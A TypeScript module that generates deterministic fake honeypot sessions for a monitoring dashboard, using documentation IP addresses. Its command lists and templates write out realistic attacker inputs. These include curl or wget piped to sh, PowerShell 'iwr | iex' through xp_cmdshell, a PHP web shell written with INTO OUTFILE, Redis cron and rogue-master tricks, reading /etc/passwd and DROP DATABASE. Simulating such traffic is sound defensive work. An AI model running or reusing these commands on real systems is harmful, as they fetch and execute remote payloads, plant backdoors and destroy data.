/**
 * Deterministic fake data shaped exactly like the API responses.
 * Documentation addresses only (RFC 5737: 192.0.2.0/24, 198.51.100.0/24,
 * 203.0.113.0/24) and private-use ASNs (RFC 5398). Organisation names are
 * made up. Times are relative to when the module loads, so the UI looks live.
 */
import type { SensorEvent, Session, Sensor } from "@/lib/api"
import { SENSOR_META, SENSORS } from "@/lib/sensors"

function mulberry32(seed: number) {
  let a = seed >>> 0
  return () => {
    a = (a + 0x6d2b79f5) >>> 0
    let t = a
    t = Math.imul(t ^ (t >>> 15), t | 1)
    t ^= t + Math.imul(t ^ (t >>> 7), t | 61)
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296
  }
}

type Rand = () => number

function pick<T>(rand: Rand, list: readonly T[]): T {
  const v = list[Math.floor(rand() * list.length)]
  if (v === undefined) throw new Error("empty list")
  return v
}

function int(rand: Rand, min: number, max: number) {
  return Math.floor(rand() * (max - min + 1)) + min
}

const RDP_TOOLS = ["FreeRDP", "FreeRDP", "FreeRDP", "mstsc", "rdesktop", "nmap", "unknown"] as const

const PREFIXES = ["192.0.2", "198.51.100", "203.0.113"] as const

// Weighted like a real Swiss sensor sees it: mostly neighbours and big clouds
// (France, Germany, Netherlands, United States, China), then a long tail.
const FR = { country: "FR", city: "Roubaix", asn: 64505, org: "Hexagone Serveurs" }
const DE = { country: "DE", city: "Frankfurt", asn: 64499, org: "Rhein Compute GmbH" }
const NL = { country: "NL", city: "Amsterdam", asn: 64496, org: "Polder Cloud BV" }
const US = { country: "US", city: "Ashburn", asn: 64497, org: "Example Hosting LLC" }
const CN = { country: "CN", city: "Shenzhen", asn: 64498, org: "Sample Telecom" }
/** The persistent heavy hitters, pinned to the countries that dominate real traffic. */
const REPEAT_ORIGIN: Record<string, typeof FR> = {
  "203.0.113.77": FR,
  "198.51.100.23": DE,
  "192.0.2.14": NL,
  "198.51.100.41": FR,
  "192.0.2.85": US,
}
const ORIGINS: readonly { country: string; city: string; asn: number; org: string }[] = [
  FR,
  FR,
  FR,
  FR,
  DE,
  DE,
  DE,
  NL,
  NL,
  NL,
  US,
  US,
  US,
  CN,
  CN,
  { country: "IT", city: "Milan", asn: 64508, org: "Navigli Hosting Srl" },
  { country: "AT", city: "Vienna", asn: 64509, org: "Donau Datacenter GmbH" },
  { country: "PL", city: "Warsaw", asn: 64510, org: "Wisla Net" },
  { country: "RU", city: "Moscow", asn: 64500, org: "Demo Networks" },
  { country: "BR", city: "São Paulo", asn: 64501, org: "Placeholder Fibra" },
  { country: "IN", city: "Mumbai", asn: 64502, org: "Docs Broadband" },
  { country: "VN", city: "Hanoi", asn: 64503, org: "Test Mobile" },
  { country: "SG", city: "Singapore", asn: 64504, org: "Lion VPS Pte" },
  { country: "KR", city: "Seoul", asn: 64506, org: "Han River Data" },
  { country: "GB", city: "London", asn: 64507, org: "Thames Transit Ltd" },
]

const USERNAMES = ["root", "admin", "ubuntu", "user", "test", "oracle", "pi", "git", "postgres"]
const PASSWORDS = [
  "123456",
  "password",
  "admin",
  "root",
  "12345678",
  "qwerty",
  "P@ssw0rd",
  "raspberry",
  "changeme",
  "letmein",
]
const COMMANDS = [
  "uname -a",
  "cat /proc/cpuinfo | grep name | wc -l",
  "whoami",
  "free -m",
  "ls -la /tmp",
  "crontab -l",
  "cd /tmp; chmod +x .x",
  "nproc",
  "cat /etc/os-release",
]
const PATHS = [
  "/",
  "/.env",
  "/wp-login.php",
  "/phpinfo.php",
  "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
  "/index.php?PHP_SESSION_UPLOAD_PROGRESS=1",
  "/admin/config.php",
  "/.git/config",
]
const AGENTS = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
  "curl/8.5.0",
  "python-requests/2.32.3",
  "Go-http-client/1.1",
  "zgrab/0.x",
]

// The new sensors (M9): realistic request shapes, documentation addresses only.
const REDIS_COMMANDS = [
  "INFO server",
  "CONFIG GET dir",
  "CONFIG SET dir /var/spool/cron/",
  "CONFIG SET dbfilename root",
  "SLAVEOF 198.51.100.7 8886",
  "MODULE LOAD /tmp/exp.so",
  "FLUSHALL",
  "KEYS *",
]
const DOCKER_PATHS = [
  "/version",
  "/info",
  "/containers/json?all=1",
  "/images/json",
  "/v1.41/containers/create",
  "/images/create?fromImage=alpine&tag=latest",
]
const MYSQL_QUERIES = [
  "SELECT @@version_comment LIMIT 1",
  "SHOW DATABASES",
  "SELECT user, host FROM mysql.user",
  "SELECT LOAD_FILE('/etc/passwd')",
  "SELECT '<?php system($_GET[0]); ?>' INTO OUTFILE '/var/www/html/x.php'",
  "DROP DATABASE shop",
]
const MSSQL_QUERIES = [
  "SELECT @@VERSION",
  "EXEC sp_configure 'show advanced options', 1; RECONFIGURE",
  "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE",
  "EXEC xp_cmdshell 'whoami'",
  "EXEC xp_cmdshell 'net user'",
]
const ADB_COMMANDS = [
  "shell:getprop ro.product.model",
  "shell:uname -a",
  "shell:cd /data/local/tmp",
  "shell:pm list packages",
  "shell:ps | grep -i miner",
]
const DB_USERS: Partial<Record<Sensor, readonly string[]>> = {
  redis: ["default"],
  mysql: ["root", "admin", "mysql", "test"],
  mssql: ["sa", "admin", "sql"],
  sip: ["100", "1000", "1001", "2000", "admin"],
  smb: ["", "guest", "administrator"],
}

const DST_PORT = Object.fromEntries(SENSORS.map((s) => [s, SENSOR_META[s].port])) as Record<
  Sensor,
  number
>

export interface Fixture {
  session: Session
  events: SensorEvent[]
}

/** Stable small hash of an address (FNV-1a), so fixtures are consistent per IP. */
function ipHash(ip: string): number {
  let h = 0x811c9dc5
  for (let i = 0; i < ip.length; i++) {
    h ^= ip.charCodeAt(i)
    h = Math.imul(h, 0x01000193) >>> 0
  }
  return h
}

function sessionId(rand: Rand) {
  const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_-"
  let out = ""
  for (let i = 0; i < 11; i++) out += chars.charAt(Math.floor(rand() * chars.length))
  return out
}

function iso(ms: number) {
  return new Date(Math.floor(ms / 1000) * 1000).toISOString().replace(".000Z", "Z")
}

export function buildFixtures(count = 420, now = Date.now(), seed = 7): Fixture[] {
  const rand = mulberry32(seed)
  const out: Fixture[] = []
  let eventId = 1000
  // A few repeat visitors so the IP filter has something to show.
  // Real traffic is dominated by a few persistent addresses.
  const repeatIps = ["203.0.113.77", "198.51.100.23", "192.0.2.14", "198.51.100.41", "192.0.2.85"]
  let t = now - 40_000

  for (let i = 0; i < count; i++) {
    // Newest first; gaps grow slowly so the last 24 h hold most sessions.
    t -= int(rand, 20, 420) * 1000
    const sensor: Sensor = pick(rand, [
      "ssh",
      "ssh",
      "ssh",
      "ssh",
      "telnet",
      "telnet",
      "web",
      "web",
      "rdp",
      "redis",
      "redis",
      "docker",
      "mysql",
      "mssql",
      "adb",
      "smb",
      "smb",
      "sip",
    ] as const)
    const src_ip =
      rand() < 0.3 ? pick(rand, repeatIps) : `${pick(rand, PREFIXES)}.${int(rand, 2, 254)}`
    // Origin and enrichment belong to the address, not the session: one IP, one origin.
    rand()
    rand()
    const h = ipHash(src_ip)
    const enriched = h % 100 < 85
    const origin = REPEAT_ORIGIN[src_ip] ?? ORIGINS[h % ORIGINS.length] ?? ORIGINS[0]
    if (!origin) throw new Error("no origins")
    const id = sessionId(rand)
    const src_port = int(rand, 32768, 60999)
    const dst_port = DST_PORT[sensor]

    const tags: string[] = []
    let login_attempts = 0
    let login_success = false
    let commands = 0
    let downloads = 0
    let http_requests = 0
    let client_tool: string | null = null

    const roll = rand()
    // Commands as they were typed or sent (shell lines, Redis commands, SQL, ADB services).
    const typed: string[] = []
    let scans = 0
    let malwareUrl: string | null = null
    const host = () => `${pick(rand, PREFIXES)}.${int(rand, 2, 254)}`
    if (sensor === "web") {
      http_requests = int(rand, 1, roll < 0.2 ? 40 : 6)
      if (roll < 0.25) tags.push("php2shell")
      else if (roll < 0.55) tags.push("recon")
    } else if (sensor === "rdp") {
      login_attempts = roll < 0.3 ? 0 : int(rand, 1, 60)
      // Derived from the address hash, not from rand, so no other sensor's sequence moves.
      if (login_attempts > 0) {
        // A decoy match completed the handshake, so its client is always known (and the demo
        // always shows one). nmap probes with an NTLM handshake or two, it does not brute-force.
        const matched = h % 7 === 0
        const tools = RDP_TOOLS.filter(
          (t) => !(t === "nmap" && login_attempts > 2) && !(t === "unknown" && matched),
        )
        client_tool = tools[(h >>> 4) % tools.length] ?? null
        if (matched) {
          tags.push("weak-credentials")
          login_success = true
        }
      }
      // BlueKeep scanners check the vulnerable channel and leave without logging in.
      if (login_attempts === 0 && roll < 0.12) tags.push("bluekeep")
    } else if (sensor === "docker") {
      http_requests = int(rand, 2, 7)
      if (roll < 0.35) {
        tags.push("crypto-miner")
        if (rand() < 0.5) tags.push("container-escape")
        downloads = 1
        malwareUrl = `http://${host()}/xmrig.tar.gz`
      } else tags.push("recon")
    } else if (sensor === "redis") {
      login_attempts = roll < 0.5 ? 0 : int(rand, 1, 25)
      login_success = login_attempts === 0 || rand() < 0.4
      commands = login_success ? int(rand, 1, 7) : 0
      for (let k = 0; k < commands; k++) typed.push(pick(rand, REDIS_COMMANDS))
      if (typed.some((c) => c.startsWith("SLAVEOF"))) tags.push("redis-rogue-master")
      if (login_success && rand() < 0.35) {
        tags.push("crypto-miner")
        downloads = 1
        malwareUrl = `http://${host()}/kinsing`
        typed.push(`SET backup1 "*/2 * * * * curl -fsSL ${malwareUrl} | sh"`)
        commands += 1
      }
    } else if (sensor === "mysql" || sensor === "mssql") {
      login_attempts = int(rand, 2, roll < 0.4 ? 90 : 14)
      login_success = rand() < 0.22
      if (login_success) {
        commands = int(rand, 1, 5)
        const pool = sensor === "mysql" ? MYSQL_QUERIES : MSSQL_QUERIES
        for (let k = 0; k < commands; k++) typed.push(pick(rand, pool))
        if (typed.some((c) => c.startsWith("DROP DATABASE"))) tags.push("db-ransom")
        if (sensor === "mssql" && rand() < 0.5) {
          tags.push("malware-drop", "sql-rce")
          downloads = 1
          malwareUrl = `http://${host()}/a.ps1`
          typed.push(`EXEC xp_cmdshell 'powershell -c "iwr ${malwareUrl} | iex"'`)
          commands += 1
        }
      }
    } else if (sensor === "adb") {
      commands = int(rand, 1, 5)
      for (let k = 0; k < commands; k++) typed.push(pick(rand, ADB_COMMANDS))
      if (roll < 0.45) {
        tags.push(rand() < 0.6 ? "crypto-miner" : "mirai")
        downloads = 1
        malwareUrl = `http://${host()}/adbminer.sh`
        typed.push(`shell:busybox wget ${malwareUrl} -O- | sh`)
        commands += 1
      }
    } else if (sensor === "smb") {
      scans = int(rand, 1, 3)
      login_attempts = roll < 0.5 ? 0 : int(rand, 1, 4)
      tags.push(roll < 0.2 ? "eternalblue" : "recon")
    } else if (sensor === "sip") {
      scans = int(rand, 1, 4)
      login_attempts = roll < 0.4 ? 0 : int(rand, 1, 30)
      tags.push(roll > 0.85 ? "sip-fraud" : "recon")
    } else {
      login_attempts = roll < 0.12 ? 0 : int(rand, 1, roll < 0.5 ? 12 : 140)
      login_success = login_attempts > 0 && rand() < 0.3
      if (login_success) {
        commands = int(rand, 1, 14)
        for (let k = 0; k < commands; k++) typed.push(pick(rand, COMMANDS))
        if (rand() < 0.35) {
          downloads = int(rand, 1, 3)
          tags.push(pick(rand, ["crypto-miner", "mirai", "malware-drop"] as const))
        } else if (rand() < 0.5) tags.push("recon")
      }
    }

    const events: SensorEvent[] = []
    let ts = t
    const base = {
      sensor,
      session_id: id,
      src_ip,
      src_port,
      dst_port,
      country: enriched ? origin.country : null,
      city: enriched ? origin.city : null,
      asn: enriched ? origin.asn : null,
      org: enriched ? origin.org : null,
      abuse_score: enriched ? h % 101 : null,
      known_scanner: enriched ? (h >>> 8) % 5 === 0 : null,
      tags,
    }
    const push = (type: string, data: Record<string, unknown>, stepMs: number) => {
      ts += stepMs
      events.push({ ...base, id: eventId++, ts: iso(ts), type, data })
    }

    push("connect", sensor === "ssh" ? { client_version: "SSH-2.0-libssh_0.9.6" } : {}, 0)
    for (let k = 0; k < scans; k++) {
      if (sensor === "smb") {
        const eb = tags.includes("eternalblue")
        push(
          "scan",
          {
            kind: eb ? "smb_trans2" : "smb_negotiate",
            dialects: ["NT LM 0.12", "SMB 2.002", "SMB 2.???"],
            flags: eb ? ["smbv1", "ms17_010", "eternalblue"] : ["smbv1"],
          },
          int(rand, 50, 600),
        )
      } else {
        const method = tags.includes("sip-fraud")
          ? "INVITE"
          : pick(rand, ["OPTIONS", "REGISTER"] as const)
        push(
          "scan",
          {
            kind: "sip_request",
            method,
            user_agent: pick(rand, ["friendly-scanner", "sipvicious", "PolyPhone/1.0"]),
            flags: method === "INVITE" ? ["invite", "toll_fraud"] : [method.toLowerCase()],
          },
          int(rand, 100, 1500),
        )
      }
    }
    const users = DB_USERS[sensor] ?? USERNAMES
    for (let k = 0; k < login_attempts; k++) {
      const last = k === login_attempts - 1
      const username = pick(rand, users)
      const password = pick(rand, PASSWORDS)
      const success = login_success && last
      if (sensor === "rdp") {
        // NTLM carries a password hash, never the password: it shows only on a decoy match.
        push(
          "login_attempt",
          {
            username,
            password: success ? password : null,
            success,
            method: "rdp-ntlm",
            client_tool,
            domain: (h >>> 3) % 3 === 0 ? "OFFICE" : "WORKGROUP",
            workstation: "WIN-" + (h % 4096).toString(16).toUpperCase().padStart(3, "0"),
            ntlm_version: "v2",
            nt_response_preview: ((h * 2654435761) >>> 0).toString(16).padStart(8, "0"),
          },
          int(rand, 300, 2500),
        )
        continue
      }
      push(
        "login_attempt",
        {
          username,
          password,
          success,
          method: sensor === "mssql" ? "sql" : "password",
        },
        int(rand, 300, 2500),
      )
    }
    for (const input of typed) {
      push("command", { input }, int(rand, 800, 6000))
    }
    for (let k = 0; k < downloads; k++) {
      push(
        "download_attempt",
        {
          url: malwareUrl ?? `http://${host()}/bins/x86_64`,
          tool: sensor === "docker" ? "image" : pick(rand, ["wget", "curl"]),
          command: "",
        },
        int(rand, 500, 3000),
      )
    }
    for (let k = 0; k < http_requests; k++) {
      if (sensor === "docker") {
        const path = DOCKER_PATHS[Math.min(k, DOCKER_PATHS.length - 1)] ?? "/version"
        push(
          "http_request",
          {
            method: path.includes("create") ? "POST" : "GET",
            path,
            user_agent: pick(rand, [
              "Docker-Client/24.0.7 (linux)",
              "Go-http-client/1.1",
              "curl/8.5.0",
            ]),
            status: path.includes("create") ? 201 : 200,
            flags:
              path.includes("containers/create") && tags.includes("crypto-miner")
                ? ["container_create", "privileged", "host_mount", "miner"]
                : [],
          },
          int(rand, 100, 1500),
        )
        continue
      }
      push(
        "http_request",
        {
          method: rand() < 0.8 ? "GET" : "POST",
          path: pick(rand, PATHS),
          user_agent: pick(rand, AGENTS),
          status: pick(rand, [200, 404, 404, 403]),
        },
        int(rand, 100, 1500),
      )
    }

    // The newest couple of sessions are still open.
    const open = i < 2
    if (!open) push("disconnect", { duration_s: Math.round((ts - t) / 1000), reason: "eof" }, 400)

    const session: Session = {
      ...base,
      started_at: iso(t),
      ended_at: open ? null : iso(ts),
      last_event_at: iso(ts),
      event_count: events.length,
      login_attempts,
      login_success,
      commands,
      downloads,
      http_requests,
      client_tool,
    }
    out.push({ session, events })
  }
  return mergeSynology(out, now, seed)
}

interface SynologySpec {
  /** Minutes before `now` the session started. */
  ageMin: number
  ip: string
  logins: number
  success?: boolean
  tags: string[]
  /** HTTP requests, in order: [flags, api, method, status]. */
  requests: [string[], string | null, string | null, number][]
  downloadUrl?: string
}

const SYNOLOGY_SPECS: SynologySpec[] = [
  { ageMin: 7, ip: "198.51.100.7", logins: 24, tags: ["credential-stuffing"], requests: [] },
  {
    ageMin: 19,
    ip: "203.0.113.58",
    logins: 0,
    tags: ["recon", "synology-dsm"],
    requests: [
      [["dsm_version_probe", "dsm_api"], "SYNO.API.Info", "query", 200],
      [["dsm_version_probe"], null, null, 200],
    ],
  },
  {
    ageMin: 44,
    ip: "192.0.2.131",
    logins: 0,
    tags: ["synology-dsm", "synology-exploit"],
    requests: [
      [["dsm_version_probe"], null, null, 200],
      [["dsm_api", "sid_forge"], "SYNO.API.Auth", "login", 200],
      [["dsm_api", "sid_forge"], "SYNO.FileStation.List", "list_share", 200],
    ],
  },
  {
    ageMin: 96,
    ip: "198.51.100.202",
    logins: 3,
    tags: ["credential-stuffing", "synology-dsm"],
    requests: [],
  },
  {
    ageMin: 170,
    ip: "203.0.113.140",
    logins: 1,
    success: true,
    tags: ["synology-dsm", "synology-exploit", "malware-drop"],
    requests: [
      [["dsm_api", "scgi_injection", "file_write"], "SYNO.Core.Upgrade", "upload", 200],
      [["dsm_api", "file_write", "no_user_agent"], "SYNO.FileStation.Upload", "upload", 200],
    ],
    downloadUrl: "http://198.51.100.99/dsm/agent.sh",
  },
  {
    ageMin: 310,
    ip: "192.0.2.57",
    logins: 0,
    tags: ["synology-dsm", "synology-exploit", "c3rb3r"],
    requests: [
      [["dsm_api", "sid_forge"], "SYNO.API.Auth", "login", 200],
      [["dsm_api", "file_write", "oversized_body"], "SYNO.FileStation.Upload", "upload", 200],
      [["file_write", "ransom_indicator"], "SYNO.FileStation.Upload", "upload", 200],
    ],
  },
  { ageMin: 520, ip: "198.51.100.7", logins: 41, tags: ["credential-stuffing"], requests: [] },
  {
    ageMin: 800,
    ip: "203.0.113.58",
    logins: 0,
    tags: ["recon", "synology-dsm"],
    requests: [[["dsm_version_probe", "no_user_agent"], null, null, 200]],
  },
]

/**
 * A handful of Synology DSM sessions, built from their own generator so the other sensors'
 * sequence does not move, then merged in by start time (newest first).
 */
function mergeSynology(base: Fixture[], now: number, seed: number): Fixture[] {
  const rand = mulberry32(seed + 5000)
  let eventId = 900_000
  const extra: Fixture[] = SYNOLOGY_SPECS.map((spec) => {
    const t0 = now - spec.ageMin * 60_000
    const h = ipHash(spec.ip)
    const enriched = h % 100 < 90
    const origin = REPEAT_ORIGIN[spec.ip] ?? ORIGINS[h % ORIGINS.length] ?? ORIGINS[0]
    if (!origin) throw new Error("no origins")
    const common = {
      sensor: "synology" as Sensor,
      session_id: sessionId(rand),
      src_ip: spec.ip,
      src_port: int(rand, 32768, 60999),
      dst_port: SENSOR_META.synology.port,
      country: enriched ? origin.country : null,
      city: enriched ? origin.city : null,
      asn: enriched ? origin.asn : null,
      org: enriched ? origin.org : null,
      abuse_score: enriched ? h % 101 : null,
      known_scanner: enriched ? (h >>> 8) % 5 === 0 : null,
      tags: spec.tags,
    }
    const events: SensorEvent[] = []
    let ts = t0
    const push = (type: string, data: Record<string, unknown>, stepMs: number) => {
      ts += stepMs
      events.push({ ...common, id: eventId++, ts: iso(ts), type, data })
    }
    push("connect", {}, 0)
    const forged = spec.tags.includes("synology-exploit")
    spec.requests.forEach(([flags, api, api_method, status], k) => {
      push(
        "http_request",
        {
          method: api ? "POST" : "GET",
          path: api ? "/webapi/entry.cgi" : "/webman/login.cgi",
          user_agent: flags.includes("no_user_agent")
            ? ""
            : pick(rand, ["python-requests/2.31.0", "curl/8.5.0", "Go-http-client/1.1"]),
          status,
          flags,
          ...(api ? { api, api_method } : {}),
          dsm_version: "7.2.1-69057",
          ...(forged && flags.some((f) => f === "sid_forge" || f === "scgi_injection")
            ? { cve: flags.includes("scgi_injection") ? "CVE-2026-13684" : "CVE-2026-13639" }
            : {}),
        },
        int(rand, 200, 1800) + k * 300,
      )
    })
    for (let k = 0; k < spec.logins; k++) {
      const last = k === spec.logins - 1
      push(
        "login_attempt",
        {
          username: pick(rand, ["admin", "admin", "root", "guest", "diskstation"]),
          password: pick(rand, PASSWORDS),
          otp_present: false,
          success: Boolean(spec.success) && last,
        },
        int(rand, 300, 1500),
      )
    }
    if (spec.downloadUrl)
      push("download_attempt", { url: spec.downloadUrl, tool: "wget", command: "" }, 900)
    const http_requests = spec.requests.length
    const downloads = spec.downloadUrl ? 1 : 0
    push("disconnect", { duration_s: Math.round((ts - t0) / 1000), reason: "eof" }, 400)
    const session: Session = {
      ...common,
      started_at: iso(t0),
      ended_at: iso(ts),
      last_event_at: iso(ts),
      event_count: events.length,
      login_attempts: spec.logins,
      login_success: Boolean(spec.success),
      commands: 0,
      downloads,
      http_requests,
      client_tool: null,
    }
    return { session, events }
  })
  return [...base, ...extra].sort(
    (a, b) => Date.parse(b.session.started_at) - Date.parse(a.session.started_at),
  )
}
